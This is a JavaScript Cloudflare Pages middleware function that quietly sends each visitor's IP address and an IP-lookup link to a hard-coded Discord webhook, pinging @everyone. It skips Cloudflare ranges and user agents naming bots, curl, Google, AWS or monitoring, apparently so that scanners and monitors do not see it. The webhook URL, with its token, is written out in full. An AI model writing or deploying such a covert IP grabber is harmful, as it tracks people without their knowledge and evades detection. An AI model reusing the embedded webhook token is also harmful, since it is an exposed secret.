export async function onRequest(context) {
  const req = context.request;
  const ip = req.headers.get("CF-Connecting-IP") ?? req.headers.get("x-forwarded-for") ?? "";
  const ua = req.headers.get("User-Agent") || "";

  // 🚫 Block Cloudflare IPv6 ranges
  const isCloudflareIPv6 = 
    ip.startsWith("2a06:98c0") || 
    ip.startsWith("2606:4700") || 
    ip.startsWith("2a07:6240");

  // 🚫 Block Cloudflare IPv4 ranges (104.16.x.x - 104.31.x.x)
  const isCloudflareIPv4 = /^104\.(1[6-9]|2[0-9]|3[01])\./.test(ip);

  // 🚫 Block obvious bots
  const blockedAgents = [
    "bot", "crawler", "spider", "python", "aiohttp", "curl", 
    "letsencrypt", "cloudflare", "aws", "google", "monitoring"
  ];
  const isBot = blockedAgents.some(agent => ua.toLowerCase().includes(agent));

  // ❌ HARD FILTER - ignore bots and Cloudflare
  if (isCloudflareIPv6 || isCloudflareIPv4 || isBot || !ip || !ua) {
    return context.next();
  }

  const lookupLink = `https://www.whtop.com/tools.ip/${ip}`;

  // 🚀 Send webhook in background (no page slowdown)
  context.waitUntil(
    fetch("https://discord.com/api/webhooks/1472338172590555271/Zop_dg-2Wf5zULZGGJT380mnKqM1O6Rhfu5VwSf1f0O1zxyWyNdGVhVkPcZxYSCAbMEl", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `@everyone @here\n\n${ip}\n${lookupLink}`
      })
    })
  );

  return context.next();
}
